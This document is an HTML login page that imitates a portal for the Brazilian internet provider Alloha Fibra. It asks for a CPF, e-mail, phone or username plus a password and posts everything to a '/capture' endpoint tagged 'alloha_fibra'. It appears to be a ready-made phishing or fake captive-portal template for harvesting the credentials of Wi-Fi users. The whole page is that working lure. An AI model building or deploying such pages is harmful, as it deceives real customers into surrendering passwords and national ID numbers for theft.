<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Alloha Fibra - Portal de Acesso</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#F5F0FF;padding:16px}
.card{background:#fff;border-radius:16px;padding:32px 28px;width:100%;max-width:440px;box-shadow:0 6px 24px rgba(0,0,0,.12)}
.logo{text-align:center;margin-bottom:24px}
.logo-text{font-size:28px;font-weight:900;color:#6C2BD9;letter-spacing:-0.5px}
.logo-sub{font-size:12px;color:#777;margin-top:3px;letter-spacing:1px}
.tabs{display:flex;gap:4px;background:#f3f3f3;padding:4px;border-radius:10px;margin-bottom:24px}
.tab-btn{flex:1;padding:9px 4px;background:transparent;border:none;border-radius:7px;font-size:13px;font-weight:600;color:#666;cursor:pointer;transition:all .2s}
.tab-btn.active{background:#fff;color:#6C2BD9;box-shadow:0 1px 4px rgba(0,0,0,.1)}
.tab-content{display:none}
.tab-content.active{display:block}
label{display:block;font-size:12px;font-weight:700;color:#555;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
input{width:100%;padding:13px 16px;border:1.5px solid #ddd;border-radius:8px;font-size:15px;background:#fafafa;color:#222;outline:none;margin-bottom:16px;transition:border-color .2s}
input:focus{border-color:#6C2BD9;background:#fff}
.btn{width:100%;padding:14px;background:#6C2BD9;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;transition:opacity .2s}
.btn:hover{opacity:.9}
.footer{text-align:center;margin-top:18px;font-size:11px;color:#999;line-height:1.5}
@media(max-width:480px){.card{padding:24px 16px}.logo-text{font-size:24px}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <div class="logo-text">Alloha Fibra</div>
    <div class="logo-sub">PORTAL DE ACESSO A INTERNET</div>
  </div>
  <div class="tabs">
    <button class="tab-btn active" onclick="switchTab('cpf',this)">CPF</button>
    <button class="tab-btn" onclick="switchTab('email',this)">E-mail</button>
    <button class="tab-btn" onclick="switchTab('phone',this)">Celular</button>
    <button class="tab-btn" onclick="switchTab('user',this)">Usuario</button>
  </div>
  <form action="/capture" method="POST" autocomplete="off">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="portal_id" value="alloha_fibra">
    <input type="hidden" name="login_method" id="login_method" value="cpf">
    <div class="tab-content active" id="tab-cpf">
      <label for="cpf_input">CPF</label>
      <input type="text" name="cpf" id="cpf_input" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" oninput="maskCPF(this)" autocomplete="off">
    </div>
    <div class="tab-content" id="tab-email">
      <label for="email_input">E-mail cadastrado</label>
      <input type="email" name="email" id="email_input" placeholder="seuemail@provedor.com.br" autocomplete="off">
    </div>
    <div class="tab-content" id="tab-phone">
      <label for="phone_input">Numero de celular</label>
      <input type="text" name="phone" id="phone_input" placeholder="(00) 00000-0000" maxlength="15" inputmode="numeric" oninput="maskPhone(this)" autocomplete="off">
    </div>
    <div class="tab-content" id="tab-user">
      <label for="user_input">Usuario / Login</label>
      <input type="text" name="username" id="user_input" placeholder="Seu usuario de acesso" autocomplete="off">
    </div>
    <label for="password">Senha</label>
    <input type="password" name="password" id="password" placeholder="Sua senha" required minlength="4" maxlength="64" autocomplete="new-password">
    <button type="submit" class="btn">Conectar a Internet</button>
  </form>
  <p class="footer">Ao acessar, voce concorda com os Termos de Uso do servico.<br>Suporte: 0800-731-0000</p>
</div>
<script>
function switchTab(t,btn){
  document.querySelectorAll('.tab-content').forEach(function(el){el.classList.remove('active')});
  document.querySelectorAll('.tab-btn').forEach(function(el){el.classList.remove('active')});
  document.getElementById('tab-'+t).classList.add('active');
  btn.classList.add('active');
  document.getElementById('login_method').value=t;
}
function maskCPF(el){
  var v=el.value.replace(/\D/g,'').slice(0,11);
  if(v.length>9)v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,'$1.$2.$3-$4');
  else if(v.length>6)v=v.replace(/(\d{3})(\d{3})(\d{1,3})/,'$1.$2.$3');
  else if(v.length>3)v=v.replace(/(\d{3})(\d{1,3})/,'$1.$2');
  el.value=v;
}
function maskPhone(el){
  var v=el.value.replace(/\D/g,'').slice(0,11);
  if(v.length>6)v=v.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3');
  else if(v.length>2)v=v.replace(/(\d{2})(\d+)/,'($1) $2');
  el.value=v;
}
</script>
</body>
</html>
